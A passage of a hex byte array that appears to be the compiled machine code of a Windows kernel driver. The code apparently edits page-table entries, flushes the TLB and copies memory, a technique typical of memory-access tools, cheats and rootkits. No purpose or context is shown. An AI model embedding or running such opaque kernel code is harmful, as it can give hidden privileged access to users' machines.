0x03, 0x01, 0x00, 0x00, 0x33, 0xD2, 0x49, 0x89, 0x73, 0x08, 0x49, 0x89, 0x53, 0xC8, 0x48, 0x8B,
0xC3, 0x49, 0x89, 0x53, 0x18, 0x49, 0x89, 0x7B, 0x10, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
0x48, 0x3B, 0xD8, 0x72, 0x42, 0x48, 0x8D, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x89, 0x7C,
0x24, 0x28, 0x4C, 0x8D, 0x4C, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4C, 0x8B, 0xC3, 0x49,
0x8B, 0xD4, 0x49, 0x8B, 0xCE, 0xE8, 0xA6, 0xF9, 0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x85, 0x95, 0x00,
0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0x80, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x42, 0xFF, 0x48, 0xF7,
0xD0, 0x48, 0x23, 0xC3, 0x48, 0x03, 0xC2, 0x49, 0x8B, 0x76, 0x10, 0x48, 0x8D, 0x7A, 0xFF, 0x48,
0x23, 0xFB, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x48, 0x03, 0x7C, 0x24, 0x30, 0x44, 0x8B, 0xC5, 0x8B,
0xCF, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x2B, 0xD1, 0x48, 0xB9, 0xFF, 0x0F, 0x00, 0x00, 0x00,
0x00, 0xF0, 0xFF, 0x3B, 0xEA, 0x44, 0x0F, 0x43, 0xC2, 0x48, 0x8B, 0x16, 0x48, 0x23, 0xD1, 0x48,
0x8B, 0xCF, 0x48, 0x81, 0xE1, 0x03, 0xF1, 0xFF, 0xFF, 0x48, 0x0B, 0xD1, 0x48, 0x81, 0xCA, 0x03,
0x01, 0x00, 0x00, 0x48, 0x89, 0x16, 0x49, 0x8B, 0x0E, 0x0F, 0x01, 0x39, 0x81, 0xE7, 0xFF, 0x0F,
0x00, 0x00, 0x49, 0x8B, 0xF5, 0x48, 0x03, 0xF9, 0x4D, 0x03, 0xE8, 0x49, 0x03, 0xD8, 0x41, 0x8B,
0xC8, 0xF3, 0xA4, 0x41, 0x2B, 0xE8, 0x74, 0x0D, 0x48, 0x8B, 0x94, 0x24, 0x80, 0x00, 0x00, 0x00,
0xE9, 0x3B, 0xFF, 0xFF, 0xFF, 0x33, 0xC0, 0x48, 0x8B, 0x74, 0x24, 0x70, 0x48, 0x8B, 0x7C, 0x24,
0x78, 0x48, 0x8B, 0x9C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x40, 0x41, 0x5F, 0x41,
0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5D, 0xC3, 0xB8, 0x16, 0x00, 0x00, 0x00, 0xEB, 0xE3, 0xCC, 0xCC,
0x4C, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x54, 0x24, 0x10, 0x53, 0x56, 0x57, 0x41, 0x56, 0x41,
0x57, 0x48, 0x83, 0xEC, 0x40, 0x49, 0x8B, 0xF0, 0x4C, 0x8B, 0xFA, 0x48, 0x8B, 0xF9, 0x48, 0x89,
0x8C, 0x24, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xFB, 0x46, 0x00, 0x00, 0xFF, 0xD0, 0x84,
0xC0, 0x0F, 0x84, 0xC6, 0x01, 0x00, 0x00, 0x80, 0x3E, 0x00, 0x0F, 0x85, 0xBD, 0x01, 0x00, 0x00,
0x4C, 0x8B, 0xC6, 0x49, 0x8B, 0xD7, 0x48, 0x8B, 0x0F, 0xE8, 0xB2, 0xFF, 0xFF, 0xFF, 0x80, 0x3E,
0x00, 0x0F, 0x85, 0xA6, 0x01, 0x00, 0x00, 0x45, 0x33, 0xF6, 0x41, 0x8B, 0xDE, 0x48, 0x8B, 0x87,
0x80, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x05, 0x48, 0x8B, 0xD8, 0xEB, 0x46, 0x48, 0x8B,
0x4F, 0x48, 0x48, 0x85, 0xC9, 0x74, 0x3D, 0x48, 0x8B, 0x05, 0xAA, 0x46, 0x00, 0x00, 0xFF, 0xD0,
0x84, 0xC0, 0x74, 0x30, 0x48, 0x8B, 0x47, 0x48, 0x48, 0x8B, 0x08, 0x48, 0x85, 0xC9, 0x74, 0x24,
0x48, 0x8B, 0x05, 0x91, 0x46, 0x00, 0x00, 0xFF, 0xD0, 0x84, 0xC0, 0x74, 0x17, 0x48, 0x8B, 0x47,
0x48, 0x48, 0x8B, 0x08, 0x48, 0x8B, 0x41, 0x40, 0x48, 0x85, 0xC0, 0x74, 0x07, 0x48, 0x8B, 0xD8,
0x48, 0x83, 0xE3, 0xF8, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0x31, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x05,
0x64, 0x46, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0xD0, 0x84, 0xC0, 0x0F, 0x84, 0x1D, 0x01, 0x00,
0x00, 0x48, 0x8B, 0x4B, 0x60, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x10, 0x01, 0x00, 0x00, 0x66, 0x44,
0x39, 0x73, 0x58, 0x0F, 0x86, 0x05, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x38, 0x46, 0x00, 0x00,
0xFF, 0xD0, 0x84, 0xC0, 0x0F, 0x84, 0xF4, 0x00, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x0F, 0x11, 0x44,
0x24, 0x28, 0x0F, 0xB7, 0x43, 0x58, 0x66, 0xD1, 0xE8, 0x66, 0xFF, 0xC8, 0x41, 0xB8, 0xFF, 0xFF,
0x00, 0x00, 0x66, 0x89, 0x44, 0x24, 0x20, 0x0F, 0xB7, 0xC8, 0x48, 0x03, 0xC9, 0x48, 0x8B, 0x53,
0x60, 0x66, 0x85, 0xC0, 0x74, 0x20, 0x66, 0x83, 0x3C, 0x11, 0x5C, 0x74, 0x06, 0x66, 0x41, 0x03,
0xC0, 0xEB, 0xDF, 0x66, 0x85, 0xC0, 0x74, 0x0E, 0x66, 0x83, 0x3C, 0x11, 0x5C, 0x75, 0x07, 0x44,
0x0F, 0xB7, 0xF0, 0x41, 0xFF, 0xC6, 0x66, 0x44, 0x89, 0x74, 0x24, 0x24, 0x66, 0x85, 0xC0, 0x75,
0x12, 0x66, 0x83, 0x3A, 0x5C, 0x75, 0x0C, 0x41, 0xBE, 0x01, 0x00, 0x00, 0x00, 0x66, 0x44, 0x89,
0x74, 0x24, 0x24, 0x41, 0x0F, 0xB7, 0xC6, 0x48, 0x8D, 0x0C, 0x00, 0x48, 0x8D, 0x04, 0x11, 0x48,
0x89, 0x44, 0x24, 0x30, 0x0F, 0xB7, 0x43, 0x58, 0x66, 0x2B, 0xC1, 0x66, 0x89, 0x44, 0x24, 0x28,
0x66, 0x89, 0x44, 0x24, 0x2A, 0x48, 0x8B, 0x05, 0xBC, 0x46, 0x00, 0x00, 0x41, 0xB0, 0x01, 0x49,
0x8B, 0xD7, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x85, 0xC0, 0x75, 0x3A, 0x0F, 0xB6, 0x57,
0x20, 0x48, 0xC1, 0xE2, 0x20, 0x8B, 0x47, 0x18, 0x48, 0x0B, 0xD0, 0x0F, 0xB6, 0x4F, 0x21, 0x48,
0xC1, 0xE1, 0x20, 0x8B, 0x47, 0x1C, 0x48, 0x0B, 0xC8, 0x48, 0x8B, 0xC2, 0x48, 0xC1, 0xE0, 0x0C,
0x48, 0x89, 0x46, 0x08, 0x48, 0x2B, 0xCA, 0x48, 0xFF, 0xC1, 0x48, 0xC1, 0xE1, 0x0C, 0x48, 0x89,
0x4E, 0x10, 0xC6, 0x06, 0x01, 0xEB, 0x26, 0xEB, 0x15, 0x48, 0x8B, 0xB4, 0x24, 0x80, 0x00, 0x00,
0x00, 0x4C, 0x8B, 0x7C, 0x24, 0x78, 0x48, 0x8B, 0xBC, 0x24, 0x88, 0x00, 0x00, 0x00, 0x4C, 0x8B,
0xC6, 0x49, 0x8B, 0xD7, 0x48, 0x8B, 0x4F, 0x08, 0xE8, 0x03, 0xFE, 0xFF, 0xFF, 0x48, 0x83, 0xC4,
0x40, 0x41, 0x5F, 0x41, 0x5E, 0x5F, 0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x41,
0x56, 0x48, 0x83, 0xEC, 0x60, 0x4D, 0x8B, 0xF1, 0x49, 0x8B, 0xF8, 0x48, 0x8B, 0x35, 0x16, 0x45,
0x00, 0x00, 0x48, 0x85, 0xF6, 0x0F, 0x84, 0x11, 0x01, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x0F, 0x84,
0x08, 0x01, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xFF, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC9,
0x0F, 0x84, 0xF6, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x49, 0x89, 0x00, 0x49, 0x89, 0x01, 0x0F, 0x57,
0xC0, 0x0F, 0x11, 0x44, 0x24, 0x28, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0xFF, 0x15, 0xFF, 0x44, 0x00,
0x00, 0x48, 0x8B, 0x05, 0x70, 0x45, 0x00, 0x00, 0x41, 0xB0, 0x01, 0x48, 0x8D, 0x54, 0x24, 0x38,
0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x85, 0xC0, 0x0F, 0x88, 0xC2, 0x00, 0x00, 0x00, 0x48,
0x8D, 0x15, 0xEA, 0x2D, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x48, 0xFF, 0x15, 0x97, 0x45, 0x00,
0x00, 0x48, 0x8B, 0x05, 0xC0, 0x44, 0x00, 0x00, 0x41, 0xB0, 0x01, 0x48, 0x8D, 0x54, 0x24, 0x28,
0x48, 0x8D, 0x4C, 0x24, 0x48, 0xFF, 0xD0, 0x84, 0xC0, 0x74, 0x11, 0x48, 0x8B, 0x86, 0xB0, 0x02,
0x00, 0x00, 0x48, 0x89, 0x07, 0x33, 0xC0, 0xE9, 0x85, 0x00, 0x00, 0x00, 0xBA, 0x18, 0x00, 0x00,
0x00, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x64, 0x61, 0x53, 0x56, 0xFF, 0x15, 0x3E, 0x45,
0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x75, 0x12, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF,
0x15, 0x93, 0x44, 0x00, 0x00, 0xB8, 0x9A, 0x00, 0x00, 0xC0, 0xEB, 0x55, 0x0F, 0x57, 0xC0, 0x33,
0xC0, 0x0F, 0x11, 0x03, 0x48, 0x89, 0x43, 0x10, 0x48, 0x8B, 0x05, 0x19, 0x44, 0x00, 0x00, 0x48,
0x8D, 0x8E, 0x58, 0x05, 0x00, 0x00, 0xFF, 0xD0, 0x84, 0xC0, 0x74, 0x2C, 0x48, 0x8B, 0x8E, 0x58,
0x05, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x20, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, 0x54, 0x24, 0x28,
0xE8, 0xCB, 0xFC, 0xFF, 0xFF, 0x80, 0x3B, 0x00, 0x74, 0x0E, 0x48, 0x8B, 0x43, 0x08, 0x48, 0x89,
0x07, 0x48, 0x8B, 0x43, 0x10, 0x49, 0x89, 0x06, 0xEB, 0x07, 0xEB, 0x05, 0xB8, 0x0D, 0x00, 0x00,
0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x70, 0x48, 0x8B, 0x74, 0x24, 0x78, 0x48, 0x8B, 0xBC, 0x24, 0x80,
0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x60, 0x41, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x41,
0x56, 0x48, 0x83, 0xEC, 0x60, 0x4D, 0x8B, 0xF1, 0x49, 0x8B, 0xF8, 0x48, 0x8B, 0x35, 0xB6, 0x43,
0x00, 0x00, 0x48, 0x85, 0xF6, 0x0F, 0x84, 0x11, 0x01, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x0F, 0x84,
0x08, 0x01, 0x00, 0x00, 0x4D, 0x85, 0xC0, 0x0F, 0x84, 0xFF, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC9,
0x0F, 0x84, 0xF6, 0x00, 0x00, 0x00, 0x33, 0xC0, 0x49, 0x89, 0x00, 0x49, 0x89, 0x01, 0x0F, 0x57,
0xC0, 0x0F, 0x11, 0x44, 0x24, 0x28, 0x48, 0x8D, 0x4C, 0x24, 0x38, 0xFF, 0x15, 0x9F, 0x43, 0x00,
0x00, 0x48, 0x8B, 0x05, 0x10, 0x44, 0x00, 0x00, 0x41, 0xB0, 0x01, 0x48, 0x8D, 0x54, 0x24, 0x38,
0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF, 0xD0, 0x85, 0xC0, 0x0F, 0x88, 0xC2, 0x00, 0x00, 0x00, 0x48,
0x8D, 0x15, 0x8A, 0x2C, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x48, 0xFF, 0x15, 0x37, 0x44, 0x00,
0x00, 0x48, 0x8B, 0x05, 0x60, 0x43, 0x00, 0x00, 0x41, 0xB0, 0x01, 0x48, 0x8D, 0x54, 0x24, 0x28,
0x48, 0x8D, 0x4C, 0x24, 0x48, 0xFF, 0xD0, 0x84, 0xC0, 0x74, 0x11, 0x48, 0x8B, 0x86, 0x20, 0x05,
0x00, 0x00, 0x48, 0x89, 0x07, 0x33, 0xC0, 0xE9, 0x85, 0x00, 0x00, 0x00, 0xBA, 0x18, 0x00, 0x00,
0x00, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x64, 0x61, 0x53, 0x56, 0xFF, 0x15, 0xDE, 0x43,
0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x75, 0x12, 0x48, 0x8D, 0x4C, 0x24, 0x28, 0xFF,
0x15, 0x33, 0x43, 0x00, 0x00, 0xB8, 0x9A, 0x00, 0x00, 0xC0, 0xEB, 0x55, 0x0F, 0x57, 0xC0, 0x33,
0xC0, 0x0F, 0x11, 0x03, 0x48, 0x89, 0x43, 0x10, 0x48, 0x8B, 0x05, 0xB9, 0x42, 0x00, 0x00, 0x48,
0x8D, 0x8E, 0x58, 0x05, 0x00, 0x00, 0xFF, 0xD0, 0x84, 0xC0, 0x74, 0x2C, 0x48, 0x8B, 0x8E, 0x58,
0x05, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x20, 0x4C, 0x8B, 0xC3, 0x48, 0x8D, 0x54, 0x24, 0x28,
0xE8, 0x6B, 0xFB, 0xFF, 0xFF, 0x80, 0x3B, 0x00, 0x74, 0x0E, 0x48, 0x8B, 0x43, 0x08, 0x48, 0x89,
0x07, 0x48, 0x8B, 0x43, 0x10, 0x49, 0x89, 0x06, 0xEB, 0x07, 0xEB, 0x05, 0xB8, 0x0D, 0x00, 0x00,
0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x70, 0x48, 0x8B, 0x74, 0x24, 0x78, 0x48, 0x8B, 0xBC, 0x24, 0x80,
0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x60, 0x41, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x6C, 0x24, 0xD9,
0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x32, 0x2C, 0x00, 0x00, 0x48, 0xC7,
0x45, 0x7F, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45, 0xFF, 0x48, 0x8D, 0x75, 0xF7, 0x48, 0x8D,
0x05, 0x3B, 0x2C, 0x00, 0x00, 0x48, 0xC7, 0x45, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x45,
0x0F, 0x33, 0xDB, 0xC7, 0x45, 0xF7, 0x1C, 0x00, 0x1E, 0x00, 0xC7, 0x45, 0x07, 0x20, 0x00, 0x22,
0x00, 0x48, 0x8B, 0x05, 0xB8, 0x2D, 0x00, 0x00, 0xBF, 0x01, 0x00, 0x00, 0xC0, 0x4C, 0x8B, 0x30,
0x48, 0x8B, 0x05, 0xF1, 0x42, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x27, 0x48, 0x8D, 0x15, 0x4D,
0x2B, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xD7, 0xFF, 0x15, 0x33, 0x2D, 0x00, 0x00, 0x48, 0x8D, 0x4D,
0xD7, 0xFF, 0x15, 0x59, 0x2D, 0x00, 0x00, 0x48, 0x89, 0x05, 0xCA, 0x42, 0x00, 0x00, 0x48, 0x85,
0xC0, 0x74, 0x38, 0x48, 0x83, 0x3D, 0x75, 0x2D, 0x00, 0x00, 0x00, 0x74, 0x2E, 0x48, 0x8D, 0x4D,
0x6F, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x4C, 0x24, 0x38, 0x45, 0x33, 0xC0, 0x48, 0xC7, 0x44, 0x24,
0x30, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x40, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x28, 0x00, 0x48,
0x8B, 0xCE, 0x4C, 0x89, 0x74, 0x24, 0x20, 0xFF, 0xD0, 0x8B, 0xF8, 0x85, 0xFF, 0x79, 0x13, 0x48,
0xFF, 0xC3, 0x48, 0x83, 0xC6, 0x10, 0x48, 0x83, 0xFB, 0x02, 0x0F, 0x82, 0x71, 0xFF, 0xFF, 0xFF,
0xEB, 0x0A, 0x48, 0x8B, 0x4D, 0x6F, 0xFF, 0x15, 0xA4, 0x2C, 0x00, 0x00, 0x48, 0x83, 0x7D, 0x6F,
0x00, 0x0F, 0x84, 0x11, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x12, 0x2D, 0x00, 0x00, 0x48, 0x8D,
0x35, 0xEB, 0x2A, 0x00, 0x00, 0xC7, 0x45, 0xC7, 0x20, 0x00, 0x22, 0x00, 0x41, 0xBC, 0x01, 0x00,
0x00, 0xC0, 0x48, 0x89, 0x75, 0xCF, 0x48, 0x8B, 0x18, 0x48, 0x8B, 0x05, 0x38, 0x42, 0x00, 0x00,
0x48, 0x85, 0xC0, 0x75, 0x27, 0x48, 0x8D, 0x15, 0x94, 0x2A, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xE7,
0xFF, 0x15, 0x7A, 0x2C, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xE7, 0xFF, 0x15, 0xA0, 0x2C, 0x00, 0x00,
0x48, 0x89, 0x05, 0x11, 0x42, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x3A, 0x48, 0x83, 0x3D, 0xBC,
0x2C, 0x00, 0x00, 0x00, 0x74, 0x30, 0x48, 0x8D, 0x4D, 0x7F, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x4C,
0x24, 0x38, 0x45, 0x33, 0xC0, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D,
0x4D, 0xC7, 0xC6, 0x44, 0x24, 0x28, 0x00, 0xBA, 0x40, 0x00, 0x00, 0x00, 0x48, 0x89, 0x5C, 0x24,
0x20, 0xFF, 0xD0, 0x44, 0x8B, 0xE0, 0x45, 0x85, 0xE4, 0x0F, 0x88, 0x74, 0x01, 0x00, 0x00, 0x48,
0x8B, 0x45, 0x6F, 0x48, 0x8B, 0x78, 0x08, 0x48, 0x89, 0x7D, 0x77, 0x48, 0x85, 0xFF, 0x0F, 0x84,
0x55, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xAC, 0x24, 0x98, 0x00, 0x00, 0x00, 0x0F, 0x1F, 0x40, 0x00,
0x4C, 0x8B, 0x75, 0x7F, 0x48, 0x8D, 0x4D, 0xD7, 0x0F, 0x57, 0xC0, 0x48, 0x8B, 0xD6, 0x41, 0xBC,
0x01, 0x00, 0x00, 0xC0, 0x0F, 0x11, 0x45, 0xD7, 0x41, 0x8B, 0x46, 0x20, 0x4D, 0x8B, 0x7E, 0x18,
0x89, 0x45, 0x67, 0xFF, 0x15, 0xD7, 0x2B, 0x00, 0x00, 0x48, 0x8B, 0x47, 0x18, 0x48, 0x8D, 0x5F,
0x18, 0x4C, 0x8B, 0xEF, 0x48, 0x85, 0xC0, 0x74, 0x30, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
0x48, 0x8B, 0x48, 0x08, 0x48, 0x8D, 0x55, 0xD7, 0x48, 0x83, 0xC1, 0x38, 0x41, 0xB0, 0x01, 0xFF,
0x15, 0x53, 0x2C, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x10, 0x4C, 0x8B, 0x2B, 0x49, 0x8B, 0x45, 0x18,
0x49, 0x8D, 0x5D, 0x18, 0x48, 0x85, 0xC0, 0x75, 0xD7, 0x49, 0x83, 0x7D, 0x18, 0x00, 0x0F, 0x84,
0xB2, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x76, 0x08, 0x4D, 0x85, 0xF6, 0x0F, 0x84, 0xA5, 0x00, 0x00,
0x00, 0x4D, 0x39, 0x75, 0x18, 0x0F, 0x85, 0x80, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x7D, 0x40, 0x33,
0xF6, 0x48, 0xC7, 0x05, 0xFC, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1F, 0x40, 0x00,
0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xEF, 0x2B, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x59, 0x48, 0x83, 0x3D,
0xE3, 0x40, 0x00, 0x00, 0x00, 0x74, 0x0A, 0x48, 0x83, 0x3D, 0x01, 0x41, 0x00, 0x00, 0x00, 0x75,
0x7D, 0x48, 0x8B, 0x1F, 0x49, 0x3B, 0xDE, 0x75, 0x09, 0x4C, 0x89, 0x35, 0xC8, 0x40, 0x00, 0x00,
0xEB, 0x27, 0x49, 0x3B, 0xDF, 0x76, 0x22, 0x8B, 0x45, 0x67, 0x49, 0x03, 0xC7, 0x48, 0x3B, 0xD8,
0x73, 0x17, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0xAD, 0x2B, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x0A, 0x48,
0x89, 0x1D, 0xCA, 0x40, 0x00, 0x00, 0x45, 0x33, 0xE4, 0xFF, 0xC6, 0x48, 0xFF, 0xC7, 0x81, 0xFE,
0x00, 0x10, 0x00, 0x00, 0x72, 0x9A, 0x45, 0x85, 0xE4, 0x74, 0x10, 0x49, 0x8B, 0x46, 0x10, 0x4C,
0x8B, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x66, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0x7D, 0x77, 0x48,
0x8D, 0x35, 0x1A, 0x29, 0x00, 0x00, 0x45, 0x85, 0xE4, 0x79, 0x16, 0x48, 0x8B, 0x7F, 0x10, 0x48,
0x89, 0x7D, 0x77, 0x48, 0x85, 0xFF, 0x0F, 0x85, 0xC4, 0xFE, 0xFF, 0xFF, 0xEB, 0x03, 0x45, 0x33,
0xE4, 0x4C, 0x8B, 0xAC, 0x24, 0x98, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x7F, 0xFF, 0x15, 0x8D,
0x2A, 0x00, 0x00, 0x41, 0x8B, 0xC4, 0xEB, 0x02, 0x8B, 0xC7, 0x48, 0x81, 0xC4, 0xA0, 0x00, 0x00,
0x00, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0x6C,
0x24, 0xE1, 0x48, 0x81, 0xEC, 0x98, 0x00, 0x00, 0x00, 0x45, 0x33, 0xED, 0xC7, 0x45, 0xF7, 0x1C,
0x00, 0x1E, 0x00, 0x48, 0x8D, 0x05, 0x56, 0x29, 0x00, 0x00, 0x4C, 0x89, 0x6D, 0x77, 0x48, 0x89,
0x45, 0xFF, 0x48, 0x8D, 0x75, 0xF7, 0x48, 0x8D, 0x05, 0x13, 0x29, 0x00, 0x00, 0x4C, 0x89, 0x6D,
0x6F, 0x48, 0x89, 0x45, 0x0F, 0x41, 0x8B, 0xDD, 0xC7, 0x45, 0x07, 0x20, 0x00, 0x22, 0x00, 0x90,
0x48, 0x8B, 0x05, 0x99, 0x2A, 0x00, 0x00, 0xBF, 0x01, 0x00, 0x00, 0xC0, 0x4C, 0x8B, 0x30, 0x48,
0x8B, 0x05, 0xD2, 0x3F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x27, 0x48, 0x8D, 0x15, 0x2E, 0x28,
0x00, 0x00, 0x48, 0x8D, 0x4D, 0xD7, 0xFF, 0x15, 0x14, 0x2A, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xD7,
0xFF, 0x15, 0x3A, 0x2A, 0x00, 0x00, 0x48, 0x89, 0x05, 0xAB, 0x3F, 0x00, 0x00, 0x48, 0x85, 0xC0,
0x74, 0x33, 0x4C, 0x39, 0x2D, 0x57, 0x2A, 0x00, 0x00, 0x74, 0x2A, 0x48, 0x8D, 0x4D, 0x6F, 0x45,
0x33, 0xC9, 0x48, 0x89, 0x4C, 0x24, 0x38, 0x45, 0x33, 0xC0, 0x4C, 0x89, 0x6C, 0x24, 0x30, 0xBA,
0x40, 0x00, 0x00, 0x00, 0x44, 0x88, 0x6C, 0x24, 0x28, 0x48, 0x8B, 0xCE, 0x4C, 0x89, 0x74, 0x24,
0x20, 0xFF, 0xD0, 0x8B, 0xF8, 0x85, 0xFF, 0x79, 0x13, 0x48, 0xFF, 0xC3, 0x48, 0x83, 0xC6, 0x10,
0x48, 0x83, 0xFB, 0x02, 0x0F, 0x82, 0x76, 0xFF, 0xFF, 0xFF, 0xEB, 0x0A, 0x48, 0x8B, 0x4D, 0x6F,
0xFF, 0x15, 0x8A, 0x29, 0x00, 0x00, 0x4C, 0x39, 0x6D, 0x6F, 0x0F, 0x84, 0xF2, 0x01, 0x00, 0x00,
0x48, 0x8B, 0x05, 0xF9, 0x29, 0x00, 0x00, 0x48, 0x8D, 0x35, 0x02, 0x28, 0x00, 0x00, 0xC7, 0x45,
0xC7, 0x20, 0x00, 0x22, 0x00, 0xBF, 0x01, 0x00, 0x00, 0xC0, 0x48, 0x89, 0x75, 0xCF, 0x48, 0x8B,
0x18, 0x48, 0x8B, 0x05, 0x20, 0x3F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x75, 0x27, 0x48, 0x8D, 0x15,
0x7C, 0x27, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xE7, 0xFF, 0x15, 0x62, 0x29, 0x00, 0x00, 0x48, 0x8D,
0x4D, 0xE7, 0xFF, 0x15, 0x88, 0x29, 0x00, 0x00, 0x48, 0x89, 0x05, 0xF9, 0x3E, 0x00, 0x00, 0x48,
0x85, 0xC0, 0x74, 0x34, 0x4C, 0x39, 0x2D, 0xA5, 0x29, 0x00, 0x00, 0x74, 0x2B, 0x48, 0x8D, 0x4D,
0x77, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x4C, 0x24, 0x38, 0x45, 0x33, 0xC0, 0x4C, 0x89, 0x6C, 0x24,
0x30, 0x48, 0x8D, 0x4D, 0xC7, 0x44, 0x88, 0x6C, 0x24, 0x28, 0xBA, 0x40, 0x00, 0x00, 0x00, 0x48,
0x89, 0x5C, 0x24, 0x20, 0xFF, 0xD0, 0x8B, 0xF8, 0x85, 0xFF, 0x0F, 0x88, 0x62, 0x01, 0x00, 0x00,
0x48, 0x8B, 0x45, 0x6F, 0x48, 0x8B, 0x58, 0x08, 0x48, 0x89, 0x5D, 0x7F, 0x48, 0x85, 0xDB, 0x0F,
0x84, 0x43, 0x01, 0x00, 0x00, 0x66, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
0x4C, 0x8B, 0x75, 0x77, 0x48, 0x8D, 0x4D, 0xD7, 0x0F, 0x57, 0xC0, 0xBF, 0x01, 0x00, 0x00, 0xC0,
0x48, 0x8B, 0xD6, 0x89, 0x7D, 0x67, 0x0F, 0x11, 0x45, 0xD7, 0x4D, 0x8B, 0x7E, 0x18, 0x45, 0x8B,
0x66, 0x20, 0xFF, 0x15, 0xC8, 0x28, 0x00, 0x00, 0x48, 0x8B, 0x43, 0x18, 0x4C, 0x8B, 0xEB, 0x48,
0x83, 0xC3, 0x18, 0x48, 0x85, 0xC0, 0x74, 0x31, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
